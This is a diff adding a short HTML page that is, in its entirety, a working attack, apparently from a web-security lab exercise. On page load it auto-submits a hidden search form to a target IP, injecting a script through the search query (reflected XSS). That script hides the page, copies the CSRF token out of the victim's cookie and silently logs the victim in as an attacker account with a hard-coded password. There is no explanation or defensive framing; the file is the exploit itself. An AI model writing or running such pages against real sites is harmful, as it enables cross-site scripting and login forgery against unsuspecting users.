@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+
+<form id="search_xss" action="http://54.159.156.104/search" method="get" hidden>
+    <input id="query" type="text" name="q" placeholder="Enter search terms" autofocus class="form-control input-lg search-field">
+    <input name="csrfdefense" value="1"/>
+    <input name="xssdefense" value="0"/>
+</form>
+
+
+	
+<script>
+var xss_script = "<script> document.getElementsByTagName('html')[0].hidden = true; <\/script>"
+	+"<form id='xss_form' method='post' action='http://54.159.156.104/login?csrfdefense=1&xssdefense=0' hidden>"
+	+ "<input name='username' value='attacker'\/>"
+	+ "<input name='password' value='l33th4x'\/>"
+	+ "<input name='csrf_token' id='tok'\/>"
+	+ "<\/form>"
+
+	+ "<script>"
+	+ "var cookie = document.cookie;"
+	+ "var i1 = cookie.indexOf('=') +1;"
+	+ "var i2 = cookie.indexOf(';');"
+	+ "var cookie_val = cookie.substring(i1,i2);"
+	+ "document.getElementById('tok').value=cookie_val;"
+	+ "document.getElementById('xss_form').submit();"
+
+	+ "<\/script>";
+
+
+
+document.getElementById("query").value = xss_script;
+document.getElementById("search_xss").submit();
+</script>
+
+</body>
+
+</html>
